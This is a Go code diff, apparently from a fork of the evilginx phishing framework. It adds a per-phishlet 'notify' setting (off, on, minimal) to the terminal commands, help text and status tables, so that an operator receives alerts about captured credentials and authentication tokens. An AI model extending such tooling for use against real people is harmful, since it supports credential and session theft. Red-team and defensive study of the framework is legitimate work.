@@ -701,6 +701,13 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			t.cfg.SetSiteCustomUa(args[1], args[2])
 			return nil
+		case "notify":
+			_, err := t.cfg.GetPhishlet(args[1])
+			if err != nil {
+				return err
+			}
+			t.cfg.SetSiteNotify(args[1], args[2])
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -1199,7 +1206,9 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter)),
-			readline.PcItem("custom_ua", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("custom_ua", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("notify", readline.PcItemDynamic(t.phishletPrefixCompleter, readline.PcItem("off"), readline.PcItem("on"), readline.PcItem("minimal"))),
+		))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
@@ -1212,6 +1221,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 	h.AddSubCommand("phishlets", []string{"custom_ua"}, "custom_ua <phishlet> \"<ua>\"", "set custom user-agent for the current phishlet. note: wrap it in quotes")
+	h.AddSubCommand("phishlets", []string{"notify"}, "notify <phishlet> <off|on|minimal>", "configure notifications per phishlet. 'on' includes sensitive details, 'minimal' sends only short title. required: https://github.com/projectdiscovery/notify")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
@@ -1371,7 +1381,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	higray := color.New(color.FgWhite)
 	logray := color.New(color.FgHiBlack)
 	n := 0
-	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url", "custom_ua"}
+	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url", "custom_ua", "notify"}
 	var rows [][]string
 
 	var pnames []string
@@ -1401,6 +1411,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 			domain, _ := t.cfg.GetSiteDomain(s)
 			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
 			custom_ua, _ := t.cfg.GetSiteCustomUa(s)
+			notify := t.cfg.GetSiteNotifyMode(s)
 			n += 1
 
 			if s == site {
@@ -1415,11 +1426,11 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 					}
 				}
 
-				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "unauth_url", "params", "custom_ua"}
-				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names), logreen.Sprint(custom_ua)}
+				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "unauth_url", "params", "custom_ua", "notify"}
+				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names), logreen.Sprint(custom_ua), notify}
 				return AsRows(keys, vals)
 			} else if site == "" {
-				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logreen.Sprint(custom_ua)})
+				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logreen.Sprint(custom_ua), notify})
 			}
 		}
 	}
